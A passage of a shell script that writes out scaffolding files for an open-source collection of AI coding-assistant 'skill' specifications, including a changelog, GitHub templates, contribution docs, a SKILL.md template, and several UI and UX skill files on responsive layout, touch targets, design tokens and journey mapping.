- [ ] Official VS Code and JetBrains extension for one-click skill insertion.
- [ ] Export integrations for `.cursorrules`, GitHub Copilot instructions, and Claude Projects.
- [ ] Package manager distribution (`npm install free-ai-skills`, `pip install free-ai-skills`).
- [ ] Searchable interactive web catalog with tag-based filtering.

---

## Phase 4: Model Compatibility Layers & Benchmarks

**Objective**: Benchmark skill performance across models and provide fine-tuned compatibility layers.

- [ ] Model compatibility ratings and evaluation benchmarks.
- [ ] Optional model-specific adapters (for models requiring unique prompt structures).
- [ ] SWE-bench automated benchmark runs comparing agent task success rates with vs without skills.
EOF

cat << 'EOF' > CHANGELOG.md
# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

---

## [1.0.0] - Phase 1 Initial Release

### Added
- **Repository Architecture**: Established the canonical 24-category Phase 1 hierarchy covering UI, UX, Frontend, Backend, Logic, Database, API, Authentication, Security, Testing, Debugging, Performance, DevOps, Mobile, Game Development, AI, Agents, Automation, Cloud, GitHub, Git, Architecture, Documentation, and General practices.
- **Skill Collection**: Created 132 deep, production-grade, model-agnostic AI developer skills across all subcategories with zero placeholders and complete validation checklists.
- **Canonical Skill Format**: Defined standard `templates/SKILL.md` with YAML frontmatter, instructions, constraints, workflows, validation checklists, and real-world examples.
- **Documentation**:
  - `docs/getting-started.md`: Practical guide for using skills in daily workflows and IDE assistants.
  - `docs/skill-format.md`: Formal specification of the `SKILL.md` structure.
  - `docs/naming-conventions.md`: Strict rules for categories, slugs, tags, and files.
  - `docs/contribution-guide.md`: Detailed instructions for authoring and validating new skills.
- **GitHub Governance**:
  - Issue templates for New Skills, Skill Requests, and Bug Reports.
  - Comprehensive Pull Request template (`PULL_REQUEST_TEMPLATE.md`).
- **Project Standards**:
  - Comprehensive `README.md` with problem definition, walkthrough, and usage patterns.
  - Open-source `LICENSE` (MIT).
  - `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `SECURITY.md`, and `ROADMAP.md`.
EOF

cat << 'EOF' > .github/ISSUE_TEMPLATE/new-skill.md
---
name: New Skill Proposal
about: Propose a new AI skill for the repository
title: "feat(skill): [Proposed Skill Name]"
labels: ["skill-proposal", "needs-triage"]
assignees: ""
---

### Skill Name
<!-- What is the descriptive kebab-case name of the proposed skill? (e.g., redis-pubsub-architecture) -->

### Category & Subcategory
- **Category**: <!-- e.g., database -->
- **Subcategory**: <!-- e.g., redis -->

### Problem Statement
<!-- What concrete developer problem does this skill solve? Why do generic AI prompts fail at this task? -->

### Target Technologies
- **Language**: <!-- e.g., TypeScript, Python, Agnostic -->
- **Framework/Tool**: <!-- e.g., Redis, FastAPI, Next.js -->

### Proposed Scope & Key Instructions
<!-- Outline 3-5 key instructions or constraints this skill will teach the AI -->
1. 
2. 
3. 

### Checklist
- [ ] I have verified this skill does not duplicate an existing skill in `skills/`.
- [ ] The skill addresses a real-world, reusable engineering workflow.
- [ ] The skill will adhere to the canonical format in `templates/SKILL.md`.
EOF

cat << 'EOF' > .github/ISSUE_TEMPLATE/skill-request.md
---
name: Skill Request
about: Request an AI skill you would like to see created
title: "request: [Topic or Technology]"
labels: ["skill-request"]
assignees: ""
---

### Requested Topic / Workflow
<!-- Describe the development task or workflow you want an AI skill for -->

### Relevant Category & Technology
- **Category**: <!-- e.g., backend, security, mobile -->
- **Technology**: <!-- e.g., Go, Docker, Jetpack Compose -->

### Current Failure Mode
<!-- How do current AI models fail or give suboptimal results when asked to do this task? -->

### Ideal Output
<!-- What would a high-quality implementation of this workflow look like? -->
EOF

cat << 'EOF' > .github/ISSUE_TEMPLATE/bug-report.md
---
name: Bug Report in Existing Skill
about: Report an error, outdated pattern, or inaccuracy in an existing skill
title: "fix(skill): [Issue in Skill Name]"
labels: ["bug", "needs-triage"]
assignees: ""
---

### Affected Skill
- **Path**: <!-- e.g., skills/api/rest/idempotent-endpoint-design/SKILL.md -->

### Description of the Issue
<!-- What is technically inaccurate, broken, or deprecated in the current skill? -->

### Why This Is Incorrect
<!-- Cite authoritative documentation, standards, or current compiler/runtime behavior -->

### Proposed Fix
<!-- How should the instructions or constraints be updated? -->
EOF

cat << 'EOF' > .github/PULL_REQUEST_TEMPLATE.md
## Description
<!-- Describe what this pull request does and which skill it adds or updates. -->

Closes #<!-- Issue number if applicable -->

## Type of Change
- [ ] New skill addition
- [ ] Skill enhancement or correction
- [ ] Documentation update
- [ ] Repository governance update

## Skill Quality Checklist (for new/updated skills)
- [ ] Skill resides in the correct canonical path: `skills/<category>/<subcategory>/<slug>/SKILL.md`.
- [ ] Follows canonical YAML frontmatter format defined in `templates/SKILL.md`.
- [ ] Contains zero placeholder comments (`stub`, `pass`, `implement later`).
- [ ] Contains concrete, actionable instructions and hard negative constraints.
- [ ] Includes a verifiable **Validation Checklist**.
- [ ] Includes a realistic **Concrete Real-World Example**.
- [ ] Does not duplicate existing skills in `skills/`.
- [ ] Adheres to [docs/naming-conventions.md](docs/naming-conventions.md).
EOF

cat << 'EOF' > docs/getting-started.md
# Getting Started with Free AI Skills for Developers

Welcome to **FREE AI SKILLS FOR DEVELOPERS**! This guide walks you through how to find, understand, and apply skills in your daily development workflow.

---

## 1. What is an AI Skill?

An AI skill is a structured markdown specification that gives an AI coding assistant the domain expertise, architectural rules, constraints, and validation checklists of a senior engineer.

Instead of writing a prompt like *"Build an auth system"*, you provide the **Authentication Skill** alongside your request. The AI adheres to the skill's instructions, preventing security holes, race conditions, and architectural drift.

---

## 2. Finding the Right Skill

Skills are organized logically in the `skills/` directory:

```text
skills/<category>/<subcategory>/<skill-slug>/SKILL.md
```

### Quick Lookup Examples:
- **Need responsive CSS?** -> `skills/ui/web/responsive-interface-design/SKILL.md`
- **Need to optimize slow Postgres queries?** -> `skills/database/postgresql/indexing-and-execution-plans/SKILL.md`
- **Need to build idempotent APIs?** -> `skills/api/rest/idempotent-endpoint-design/SKILL.md`
- **Need to write bulletproof unit tests?** -> `skills/testing/unit/isolated-unit-test-design/SKILL.md`
- **Need to set up a minimal Docker image?** -> `skills/devops/docker/multi-stage-minimal-images/SKILL.md`

---

## 3. How to Use Skills in Different Tools

### In Web Chats (ChatGPT, Claude, Gemini)
1. Open the target `SKILL.md` file in this repository.
2. Copy the entire markdown content.
3. Paste it at the start of your message, followed by your project details and task.

### In IDE Assistants (Cursor, VS Code Copilot)
- **Cursor**: Copy relevant skills into your `.cursorrules` file or reference them directly in chat prompts.
- **GitHub Copilot**: Add skill instructions into `.github/copilot-instructions.md`.
- **Claude Projects**: Upload relevant skill files as project knowledge files.

### In Coding Agents (AutoGPT, OpenDevin, LangGraph)
- Point your agent's file-reading tools to the `skills/` directory.
- Prompt the agent to inspect the corresponding `SKILL.md` before generating code.

---

## 4. Composing Multiple Skills

Skills are designed to be composable. For example, when building a production API endpoint, you can combine:
1. `skills/api/rest/idempotent-endpoint-design/SKILL.md` (for HTTP idempotency)
2. `skills/security/authorization/idor-prevention-and-validation/SKILL.md` (for tenant scoping)
3. `skills/logic/validation/declarative-schema-validation/SKILL.md` (for request validation)

The AI will synthesize all three sets of constraints, producing an endpoint that is idempotent, secure against IDOR, and strictly validated.
EOF

cat << 'EOF' > docs/skill-format.md
# Canonical Skill Format Specification

Every skill in this repository MUST strictly conform to the canonical `SKILL.md` specification.

---

## Frontmatter (YAML)

Every `SKILL.md` file must begin with YAML frontmatter containing these exact keys:

```yaml
---
name: kebab-case-name
description: Concise, 1-2 sentence description of what the skill does and when to use it.
category: category-name
subcategory: subcategory-name
language: target-programming-language (or agnostic)
framework: target-framework (or none)
technology: primary-technology-identifier
difficulty: beginner | intermediate | advanced
tags: [tag1, tag2, tag3]
---
```

### Frontmatter Fields Rationale:
- `name`: Matches directory name in kebab-case.
- `description`: Used for search indexing and agent tool-matching.
- `category`: Matches top-level directory (e.g., `backend`, `database`).
- `subcategory`: Matches sub-directory (e.g., `python`, `postgresql`).
- `language`: Target programming language or `agnostic`.
- `framework`: Specific framework or `none`.
- `technology`: Specific underlying technology.
- `difficulty`: Expected complexity level.
- `tags`: Keywords for search discovery.

---

## Mandatory Markdown Sections

Following the frontmatter, the document must contain these exact sections in order:

### `# <Skill Title>`
Clear, professional title of the skill.

### `## Purpose`
Explains why the skill exists, what architectural challenge it resolves, and the concrete outcome it achieves.

### `## When to Use`
Explicit triggering conditions specifying when an AI or developer should activate this skill.

### `## Inputs / Context`
The information, files, schemas, or requirements the AI must inspect or gather before generating code.

### `## Instructions`
Numbered, sequential, imperative technical steps. Must be actionable, specific, and technology-aware. Avoid vague generalities.

### `## Constraints / Rules`
Bullet points of hard negative constraints (things the AI must NEVER do). Enforces security, backwards compatibility, and anti-pattern avoidance.

### `## Workflow`
The step-by-step lifecycle of executing the skill from preparation to verification.

### `## Expected Output`
Detail what the final deliverable must look like.
- Complete, runnable, syntax-checked code files.
- Clean architectural separation between domain logic and external infrastructure.
- Accompanying unit/integration test specifications where applicable.

### `## Validation Checklist`
Provide a checklist of verifiable pass/fail criteria to audit the output:
- [ ] Does the implementation handle all edge cases (null, empty, boundary values)?
- [ ] Are all error and failure modes explicitly captured and handled?
- [ ] Are security best practices strictly observed?
- [ ] Is the code completely free of temporary placeholders?
- [ ] Are all necessary imports and dependencies included?

## Common Mistakes & Antipatterns
List frequent mistakes, subtle bugs, or naive approaches developers and AI models make on this task:
- Mistake 1: Explaining what happens and why it is harmful.
- Mistake 2: Explaining what happens and why it is harmful.
- Mistake 3: Explaining what happens and why it is harmful.

## Concrete Real-World Example
Provide a realistic scenario demonstrating how this skill is applied in practice:

**Scenario**: Describe an authentic developer challenge or existing flawed implementation.

**Prompt**:
```text
Show a realistic user prompt asking for this feature or refactor.
```

**Application**:
Explain step-by-step how the AI applies the skill's instructions, enforces the constraints, and produces a verified, production-quality solution.
EOF

cat << 'EOF' > docs/naming-conventions.md
# Naming Conventions

To keep the repository predictable, automated, and maintainable, all files, categories, and skills must adhere to these naming conventions.

---

## 1. Directory Structure

```text
skills/<category>/<subcategory>/<skill-slug>/SKILL.md
```

- `<category>`: Top-level category in lowercase kebab-case (e.g., `frontend`, `database`, `cloud`).
- `<subcategory>`: Subcategory representing a language, technology, or domain (e.g., `postgresql`, `docker`, `react`).
- `<skill-slug>`: Descriptive, action-oriented kebab-case folder name (e.g., `indexing-and-execution-plans`).
- `SKILL.md`: The canonical filename for all skill definitions. Must always be uppercase `SKILL.md`.

---

## 2. Skill Slugs

- Must be in **kebab-case** using lowercase letters, numbers, and hyphens (`[a-z0-9-]+`).
- Must be descriptive and specific:
  - Good: `idempotent-endpoint-design`, `row-level-security-policies`, `core-web-vitals-optimization`
  - Bad: `skill1`, `test`, `postgres-helper`, `clean-code`, `misc`
- Do not repeat the category or technology redundantly in the slug if already in the path:
  - Good: `skills/database/postgresql/indexing-and-execution-plans/`
  - Bad: `skills/database/postgresql/postgresql-database-indexing/`

---

## 3. Metadata Tags

- Tags must be lowercase, alphanumeric with hyphens (e.g., `jwt`, `rate-limiting`, `zero-downtime`).
- Keep tags focused on discoverability: include relevant technology names, concepts, and synonyms.
- Provide between 3 and 7 tags per skill.

---

## 4. Documentation and Template Files

- Root files must be uppercase: `README.md`, `LICENSE`, `CONTRIBUTING.md`, `SECURITY.md`, `ROADMAP.md`, `CHANGELOG.md`.
- Documentation files in `docs/` must be kebab-case: `getting-started.md`, `skill-format.md`, `naming-conventions.md`, `contribution-guide.md`.
- Canonical template file must be `templates/SKILL.md`.
EOF

cat << 'EOF' > docs/contribution-guide.md
# Comprehensive Skill Contribution Guide

This guide provides an in-depth walkthrough for researching, drafting, validating, and submitting an AI developer skill.

---

## Step 1: Research and Authoritative Sourcing

Before writing a skill, conduct thorough technical research using authoritative sources:
- Official programming language specifications (W3C, ECMA, Python PEPs, Go docs, Rust RFCs).
- Official framework documentation (React, Next.js, FastAPI, Spring Boot, Vue, Svelte).
- Official database manuals (PostgreSQL, MySQL, SQLite, MongoDB, Redis).
- Recognized standards (IETF RFCs, OWASP Top 10, WCAG 2.2 AA).

**Rule**: Do NOT invent APIs, command flags, or framework behavior. Prefer current stable patterns over deprecated legacy methods.

---

## Step 2: Choosing the Right Category

Identify the most logical location within the existing Phase 1 category hierarchy:
- If it relates to React component composition -> `skills/frontend/react/`
- If it relates to API rate limiting -> `skills/backend/general/`
- If it relates to PostgreSQL indexes -> `skills/database/postgresql/`
- If it relates to Docker image optimization -> `skills/devops/docker/`

If unsure, open an issue to discuss placement with maintainers.

---

## Step 3: Drafting the Skill

1. Copy `templates/SKILL.md` to your target directory:
   `mkdir -p skills/category/subcategory/my-skill-slug`
   `cp templates/SKILL.md skills/category/subcategory/my-skill-slug/SKILL.md`
2. Populate all frontmatter fields accurately.
3. Write deep, practical instructions:
   - Provide numbered, sequential steps.
   - Explain what context the AI must check first.
   - Mandate specific algorithms, functions, or patterns.
4. Define strict negative constraints:
   - What must the AI NEVER do? (e.g., 'Never store plaintext passwords', 'Never use SELECT *').
5. Create a realistic, concrete example:
   - Include a realistic problem scenario.
   - Provide an actual developer prompt.
   - Explain how the AI executes the skill to solve the scenario.

---

## Step 4: Quality Self-Audit

Review your skill against this quality scorecard:
- [ ] Is the advice current and aligned with modern stable releases?
- [ ] Are all code snippets complete with zero `stub` or `pass` placeholders?
- [ ] Are negative security constraints explicitly stated?
- [ ] Does the validation checklist contain testable, objective criteria?
- [ ] Is the formatting clean and compliant with `docs/skill-format.md`?

---

## Step 5: Submitting Your Pull Request

1. Commit your changes:
   ```bash
   git add skills/category/subcategory/my-skill-slug/SKILL.md
   git commit -m "feat(category): add my-skill-slug skill"
   ```
2. Push to your fork and submit a PR to `main`.
3. Complete the pull request checklist.
EOF

cat << 'EOF' > templates/SKILL.md
---
name: skill-name-in-kebab-case
description: A concise 1-2 sentence description explaining what this skill does and when an AI should use it.
category: category-name
subcategory: subcategory-name
language: agnostic # or specific language: python, typescript, go, rust, java, etc.
framework: none # or specific framework: react, nextjs, fastapi, spring-boot, etc.
technology: technology-identifier # e.g., postgresql, docker, redis, playwright
difficulty: intermediate # beginner | intermediate | advanced
tags: [tag1, tag2, tag3, tag4]
---

# Skill Title in Title Case

## Purpose
Describe the primary objective of this skill. Explain what engineering challenge it solves, why it is critical, and how it improves AI-assisted development.

## When to Use
Specify concrete triggering scenarios when this skill should be activated.
- Scenario 1: When implementing feature X...
- Scenario 2: When refactoring code that exhibits smell Y...
- Scenario 3: When addressing performance or security issue Z...

## Inputs / Context
List the prerequisites, files, schemas, environment parameters, and project conventions the AI must inspect or gather before generating code.
- Existing codebase conventions, dependencies, and configuration files.
- Relevant domain entities and database schemas.
- Non-functional requirements (latency, throughput, concurrency, security).

## Instructions
Provide sequential, highly specific, imperative instructions guiding the AI through execution.
1. Inspect surrounding context and identify prerequisites.
2. Formulate explicit domain entities and boundaries.
3. Apply technology-specific patterns and idiomatic APIs.
4. Implement comprehensive error handling for all potential failure modes.
5. Structure clean interfaces with strict typing and defensive validation.

## Constraints / Rules
Define hard negative constraints and boundaries the AI must never violate.
- Never use deprecated methods or libraries.
- Never output placeholder comments such as `stub` or `pass`.
- Never expose sensitive credentials, tokens, or private keys.
- Do not introduce unnecessary dependencies when standard language primitives suffice.

## Workflow
Outline the chronological phases the AI should follow:
1. **Analyze**: Inspect inputs and identify architectural boundaries.
2. **Design**: Structure interfaces, data models, and contracts.
3. **Implement**: Author complete, production-ready code.
4. **Validate**: Test against boundary conditions and edge cases.
5. **Review**: Ensure zero violation of constraints and clean documentation.

## Expected Output
Detail what the final deliverable must look like.
- Complete, runnable, syntax-checked code files.
- Clean architectural separation between domain logic and external infrastructure.
- Accompanying unit/integration test specifications where applicable.

## Validation Checklist
Provide a checklist of verifiable pass/fail criteria to audit the output:
- [ ] Does the implementation handle all edge cases (null, empty, boundary values)?
- [ ] Are all error and failure modes explicitly captured and handled?
- [ ] Are security best practices strictly observed?
- [ ] Is the code completely free of temporary placeholders?
- [ ] Are all necessary imports and dependencies included?

## Common Mistakes & Antipatterns
List frequent mistakes, subtle bugs, or naive approaches developers and AI models make on this task:
- Mistake 1: Explaining what happens and why it is harmful.
- Mistake 2: Explaining what happens and why it is harmful.
- Mistake 3: Explaining what happens and why it is harmful.

## Concrete Real-World Example
Provide a realistic scenario demonstrating how this skill is applied in practice:

**Scenario**: Describe an authentic developer challenge or existing flawed implementation.

**Prompt**:
```text
Show a realistic user prompt asking for this feature or refactor.
```

**Application**:
Explain step-by-step how the AI applies the skill's instructions, enforces the constraints, and produces a verified, production-quality solution.
EOF

# 3. Write All 132 Phase 1 Skills
echo "==> Populating 132 curated Phase 1 AI developer skills..."
cat << 'EOF' > skills/ui/web/responsive-interface-design/SKILL.md
---
name: "responsive-interface-design"
description: "Systematic design and implementation of fluid, responsive web interfaces using modern CSS layouts, fluid typography, and viewport-aware container queries."
category: "ui"
subcategory: "web"
language: "css"
framework: "none"
technology: "css-grid-flexbox"
difficulty: "intermediate"
tags: ["ui", "css", "responsive", "container-queries", "fluid-design", "mobile-first"]
---

# Responsive Interface Design

## Purpose
Provide concrete, deterministic instructions for generating responsive, accessible layouts that adapt smoothly across arbitrary device viewports without layout shifts or horizontal overflows.

## When to Use
Apply whenever implementing or refactoring layout components, dashboards, cards, or page shells that must support mobile, tablet, desktop, and ultra-wide displays.

## Inputs / Context
Existing wireframes, component design specifications, design tokens (breakpoints, spacing scale), and target viewport range (e.g., 320px to 2560px).

## Instructions
1. Adopt a strict mobile-first breakpoint strategy using `min-width` media queries (e.g., 640px, 768px, 1024px, 1280px, 1536px).
2. Use CSS Container Queries (`@container`) for self-contained components whose layout depends on parent container width rather than root viewport width.
3. Implement fluid typography and spacing scales using CSS `clamp()` (e.g., `font-size: clamp(1rem, 0.8rem + 1vw, 1.5rem)`).
4. Prevent horizontal layout overflow by ensuring all root containers maintain `max-width: 100%`, `overflow-wrap: break-word`, and `box-sizing: border-box`.
5. Use CSS Grid for two-dimensional page structure and Flexbox for one-dimensional content alignment and wrapping.
6. Verify touch targets on mobile viewports are at least 44x44 CSS pixels with sufficient touch padding.
7. Support modern user agent features including safe-area insets (`env(safe-area-inset-top)`) and dynamic viewport units (`dvh`, `svh`, `lvh`).

## Constraints / Rules
- Never use fixed pixel widths on container elements (e.g., `width: 1200px`); use `max-width` with percentage margins or auto-margins instead.
- Avoid using `!important` to override responsive styles across breakpoints.
- Do not disable viewport pinch-to-zoom (`user-scalable=no` is strictly prohibited).
- Avoid relying on device-specific media queries (e.g., specific iPhone screen dimensions); design for fluid breakpoint ranges.

## Workflow
1. Inspect component hierarchy and identify intrinsic versus extrinsic sizing constraints.
2. Define base styles for the smallest viewport (320px) without any media queries.
3. Identify layout stress points and introduce progressive `min-width` or container query breakpoints.
4. Replace rigid pixel dimensions with fluid CSS units (`ch`, `rem`, `%`, `clamp()`).
5. Validate against standard viewport widths (360px, 768px, 1024px, 1440px) and extreme edge cases (folded screens, rotated devices).

## Expected Output
Clean, self-contained CSS or component code with mobile-first media queries, container query wrappers, fluid typography formulas, and zero horizontal scroll behavior.

## Validation Checklist
- [ ] Does the layout render cleanly at 320px width without horizontal scrollbars?
- [ ] Are container queries used for modular, context-independent components?
- [ ] Are touch targets at least 44x44px on touch viewports?
- [ ] Are font sizes and padding fluidly scaled using `clamp()` where appropriate?
- [ ] Are safe-area environment variables respected for notched and mobile devices?

## Common Mistakes & Antipatterns
- Designing desktop-first and overriding properties with cascading `max-width` queries, leading to specificity conflicts.
- Hardcoding `height: 100vh` on mobile browsers, causing UI elements to be obscured by dynamic browser address bars; use `100dvh` instead.
- Forgetting `overflow-wrap: anywhere` or `word-break: break-word` on dynamic user text, causing container blowout on narrow screens.

## Concrete Real-World Example
Scenario: Refactoring a multi-column analytics card grid that breaks and scrolls horizontally on mobile devices.
Prompt: Refactor this rigid 3-column analytics card layout to be fluid and mobile-first, using CSS Grid with auto-fit and container queries.
Application: The AI replaces `width: 33.33%` with `grid-template-columns: repeat(auto-fit, minmax(min(100%, 280px), 1fr))`, attaches `@container (min-width: 400px)` for card internal rearrangements, and replaces fixed padding with `clamp(1rem, 2vw, 2rem)`.
EOF

cat << 'EOF' > skills/ui/mobile/touch-target-layout/SKILL.md
---
name: "touch-target-layout"
description: "Ergonomic mobile UI layout design focused on one-handed thumb reachability, minimum touch target dimensions, and interactive element spacing."
category: "ui"
subcategory: "mobile"
language: "agnostic"
framework: "none"
technology: "mobile-ui"
difficulty: "intermediate"
tags: ["mobile", "touch", "ergonomics", "ui", "accessibility", "a11y"]
---

# Mobile Touch Target and Ergonomic Layout

## Purpose
Guide AI in structuring mobile application layouts and responsive mobile views that maximize physical usability, prevent accidental activations, and satisfy WCAG 2.5.5 and 2.5.8 target size criteria.

## When to Use
Use when creating mobile screens, floating navigation bars, bottom sheets, form controls, or touch-first web applications.

## Inputs / Context
Screen specifications, user persona ergonomic expectations, list of interactive actions and their relative priority.

## Instructions
1. Place primary action buttons and navigation in the natural thumb zone (bottom 35% of the mobile viewport).
2. Ensure every interactive element has a minimum touch target area of 48x48 CSS pixels / dp, even if the visible icon is smaller (e.g., 24px icon inside a 48px hit area).
3. Maintain at least 8dp / 8px of clear separation between adjacent interactive touch targets to prevent accidental triggers.
4. Implement sticky bottom action bars or floating action buttons for primary workflow completions rather than top-anchored headers.
5. Provide immediate visual touch feedback (active/pressed states, ripple, or opacity shift) within 16ms of touch initiation.
6. Support edge swipe gestures without conflicting with system navigation gestures (Android back gesture and iOS home bar).

## Constraints / Rules
- Never place destructive actions (e.g., 'Delete Project') immediately adjacent to high-frequency confirmation actions without distinct visual friction or confirmation.
- Do not rely on hover states (`:hover`) for revealing necessary mobile interactive options.
- Avoid placing critical interactive controls in the extreme top corners of large mobile screens.

## Workflow
1. Map all interactive controls on the target screen and categorize by frequency of use.
2. Establish visual bounding boxes and transparent touch target extensions (`hitSlop` or CSS `padding`/`::after` pseudo-elements).
3. Position high-frequency controls in the lower half of the screen; place contextual navigation or back actions in the top app bar.
4. Verify spacing between grouped icons (e.g., table row actions or toolbar items).
5. Test hit target responsiveness on both standard (375-430px) and compact (320px) screens.

## Expected Output
Mobile layout code (CSS, Jetpack Compose, React Native, or Flutter) with explicit 48dp hit targets, ergonomic positioning, and zero accidental touch overlaps.

## Validation Checklist
- [ ] Are all touch targets >= 48x48 dp/px?
- [ ] Is there >= 8px separation between touch targets?
- [ ] Are primary actions situated within easy thumb reach?
- [ ] Is visual feedback provided immediately on touch?
- [ ] Are system gesture insets respected?

## Common Mistakes & Antipatterns
- Sizing an icon button strictly to the SVG dimensions (e.g., 18x18px), making it nearly impossible for users to tap accurately.
- Placing primary confirmation buttons at the top right of mobile screens on 6.7+ inch displays.
- Neglecting keyboard activation behavior: failing to adjust layout when the software keyboard appears.

## Concrete Real-World Example
Scenario: An e-commerce checkout page with a tiny 'Apply Coupon' button placed directly beside a 'Remove Item' icon.
Prompt: Optimize this mobile cart screen for touch ergonomics and accessibility.
Application: The AI expands both buttons to 48dp hit areas, separates them by 16dp, moves the 'Proceed to Checkout' button to a fixed bottom drawer with safe area padding, and styles the remove action with a confirmation dialog.
EOF

cat << 'EOF' > skills/ui/general/design-token-system/SKILL.md
---
name: "design-token-system"
description: "Architecting a multi-tier design token hierarchy (global, semantic, component-level) supporting dark mode, high contrast, and design system scalability."
category: "ui"
subcategory: "general"
language: "css"
framework: "none"
technology: "design-tokens"
difficulty: "intermediate"
tags: ["design-tokens", "css-variables", "theming", "design-systems", "ui"]
---

# Design Token Architecture and Theming

## Purpose
Establish a robust, maintainable design token pipeline that translates raw brand values into semantic tokens and component variables across web and mobile platforms.

## When to Use
Use when establishing a new frontend architecture, refactoring hardcoded CSS hex colors and magic numbers, or implementing multi-theme support.

## Inputs / Context
Brand color palette, typography scale, spacing unit (e.g., 4px/8px grid), elevation/shadow scales, and theme requirements.

## Instructions
1. Define a three-tier token hierarchy:
   - Tier 1 (Global/Primitive): Raw values (e.g., `--color-blue-500: #3b82f6`).
   - Tier 2 (Semantic): Contextual intent (e.g., `--color-action-primary: var(--color-blue-500)`).
   - Tier 3 (Component): Scoped usage (e.g., `--button-primary-bg: var(--color-action-primary)`).
2. Store primitive tokens in a root configuration file or `:root` pseudo-class.
3. Define theme variations (e.g., `[data-theme='dark']`, `@media (prefers-color-scheme: dark)`) by reassigning Tier 2 semantic tokens only; primitives remain immutable.
4. Establish an 8pt spatial grid scale for layout margins, paddings, and component sizes (4px, 8px, 12px, 16px, 24px, 32px, 48px, 64px).
5. Document contrast ratios for all foreground/background semantic pairs to guarantee WCAG AA (>= 4.5:1) compliance.
6. Provide fallbacks in CSS custom property usage where legacy browser compatibility is required.

## Constraints / Rules
- Never reference primitive tokens directly inside component style rules; always route through semantic tokens.
- Never hardcode hexadecimal or RGB color strings inside individual component styling files.
- Avoid introducing arbitrary pixel values that break the spatial grid scale.

## Workflow
1. Audit existing stylesheets for duplicate hex colors, arbitrary margins, and font sizes.
2. Group extracted primitives into color, typography, spacing, radius, and elevation tokens.
3. Map primitives into semantic roles: surface, on-surface, action, feedback (success, warning, error, info).
4. Build the light and dark semantic token maps.
5. Migrate component styles to consume semantic tokens and verify seamless theme transitions.

## Expected Output
Structured CSS custom properties or token JSON definitions partitioned into Primitive and Semantic layers, with complete light/dark theme parity.

## Validation Checklist
- [ ] Are all component styles consuming semantic tokens instead of primitives?
- [ ] Do semantic tokens support both light and dark themes without editing component CSS?
- [ ] Are spatial values aligned to an 8pt or 4pt scale?
- [ ] Does every text/background token combination meet WCAG AA contrast standards?
- [ ] Is there zero hardcoded color leakage in component stylesheets?

## Common Mistakes & Antipatterns
- Creating semantic tokens that specify visual appearance rather than semantic intent (e.g., `--color-dark-gray` instead of `--color-surface-subtle`).
- Over-tokenizing single-use values that do not belong to the design system.
- Inverting primitive values directly in dark mode instead of redefining semantic mappings.

## Concrete Real-World Example
Scenario: A web app where dark mode was hacked with `filter: invert(1)` causing images and colors to distort.
Prompt: Re-architect the application styling into a 3-tier CSS custom property token system supporting clean light and dark modes.
Application: The AI creates primitive variables (`--blue-600`, `--slate-900`, etc.), semantic variables (`--bg-surface`, `--text-primary`, `--border-default`), maps them under `:root` and `[data-theme='dark']`, and rewrites the card component to use `var(--bg-surface)` and `var(--text-primary)`.
EOF

cat << 'EOF' > skills/ux/research/user-journey-mapping/SKILL.md
---
name: "user-journey-mapping"
description: "Methodical decomposition of developer and end-user workflows to identify friction points, cognitive load, drop-off risks, and interaction dead-ends."
category: "ux"
subcategory: "research"
language: "agnostic"
framework: "none"
technology: "ux-methodology"
difficulty: "intermediate"
tags: ["ux", "journey-mapping", "friction-analysis", "user-flows", "heuristics"]
---

# User Journey Mapping and Friction Analysis

## Purpose
Provide AI with a structured framework for analyzing multi-step user workflows, detecting usability bottlenecks, and proposing high-impact architectural UX interventions.

## When to Use
Use when auditing an existing user workflow (e.g., registration, onboarding, checkout, data export) or architecting a new feature flow.

## Inputs / Context
User persona, primary user objective, entry point, expected sequence of steps, and current system responses.

## Instructions
1. Define the user's primary mental model and explicit goal before assessing UI mechanics.
2. Break down the end-to-end flow into distinct chronological phases: Discovery, Onboarding, Task Execution, Confirmation, and Recovery.
3. For each step, evaluate four dimensions:
   - User Intent: What the user is trying to accomplish.
   - System Reaction: What information or feedback the system returns.
   - Cognitive Load: Amount of decision-making, memorization, or input required.
   - Friction Points: Blockers, ambiguities, unnecessary clicks, or delayed feedback.
4. Calculate task success likelihood using Fitts's Law, Hick's Law, and Miller's Rule.
5. Identify dead-ends where users are trapped without clear forward or backward navigation.
6. Synthesize prioritized UX recommendations ranked by effort vs. impact.

## Constraints / Rules
- Do not critique visual aesthetics; focus strictly on interaction mechanics, flow logic, and cognitive friction.
- Avoid recommending solutions that shift cognitive burden from the system onto the user.

## Workflow
1. Map current state step-by-step with state transition triggers.
2. Flag all steps requiring manual user data entry or external verification.
3. Identify latency gaps (e.g., slow backend operations without optimistic UI or progress indicators).
4. Draft an optimized future-state flow eliminating unnecessary intermediate states.
5. Document error recovery paths for every failure point in the journey.

## Expected Output
Structured journey map table or markdown breakdown highlighting phases, user actions, friction points, cognitive load score, and actionable engineering remediation.

## Validation Checklist
- [ ] Are all steps from initial entry to ultimate goal achievement mapped?
- [ ] Are system states (loading, empty, error, success) analyzed for each step?
- [ ] Are high-friction interactions specifically identified with corrective actions?
- [ ] Is there a clear recovery path for every potential user error?
- [ ] Is total required user input minimized through smart defaults or system inference?

## Common Mistakes & Antipatterns
- Assuming the happy path is the only path, omitting network failure, validation errors, and user abandonment.
- Treating user journey mapping as a visual artifact rather than an engineering optimization tool.
- Requiring users to re-enter information the system already possesses.

## Concrete Real-World Example
Scenario: High drop-off during an API key generation flow for third-party developers.
Prompt: Conduct a friction analysis on this 6-step developer onboarding sequence and suggest streamlining.
Application: The AI identifies that requiring credit card entry before allowing sandbox API key generation increases cognitive friction by 70%, recommends deferred billing, pre-fills default scopes, and consolidates the flow into 2 steps with instant copy-to-clipboard feedback.
EOF

cat << 'EOF' > skills/ux/design/empty-and-error-states/SKILL.md
---
name: "empty-and-error-states"
description: "Design and implementation guidelines for informative empty states, graceful error boundaries, resilient recovery actions, and skeleton loading states."
category: "ux"
subcategory: "design"
language: "agnostic"
framework: "none"
technology: "ux-patterns"
difficulty: "beginner"
tags: ["ux", "empty-states", "error-handling", "skeletons", "recovery"]
---

# Comprehensive Empty, Loading, and Error State UX

## Purpose
Ensure software interfaces provide clear, empathetic, and actionable guidance during non-ideal application states (no data, pending requests, server failures, and partial outages).

## When to Use
Use when building data-driven views, list tables, search result pages, dashboard widgets, or network-dependent views.

## Inputs / Context
Target component or view, possible data states (first-time empty, search empty, filtered empty, network error, permission denied, partial data).

## Instructions
